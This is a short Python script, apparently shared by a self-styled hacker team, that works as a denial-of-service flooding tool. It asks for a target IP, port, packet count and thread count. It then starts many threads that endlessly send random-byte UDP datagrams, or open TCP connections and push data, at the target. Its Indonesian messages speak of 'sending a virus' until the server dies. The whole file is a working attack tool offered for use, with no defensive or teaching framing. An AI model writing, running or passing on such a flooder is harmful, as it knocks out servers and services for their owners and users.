#!/usr/bin/env python3
#XEUS ARTHUR
#Author : Arthur AXEUS
import random
import socket
import threading
import os

os.system("clear")
print("------>>>> XEUS ARTHURXZZ TEAM <<<<------")
print("=====>>> Website : Discord.gg//XEUS <<<=====")
print("------>>> XEUS ARTHUR HACKER <<<<------")
ip = str(input(" Ip Virus Target: "))
port = int(input(" Port Virus Target: "))
choice = str(input(" Siap Mengirim Virus?(y/n): "))
times = int(input(" Packet Virus: "))
threads = int(input(" Threads Virus: "))
def run():
  data = random._urandom(1010)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | Mengirim Nuklir Dari Mars Arthur!!!|")
    except:
      print("[!] | Mengirim Nuklir Dari Mars Arthur!!! |")

def run2():
  data = random._urandom(10)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ArthurXzz Cyber Team!!!")
    except:
      s.close()
      print("[*] Virus Kebanyakan Server Mati")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
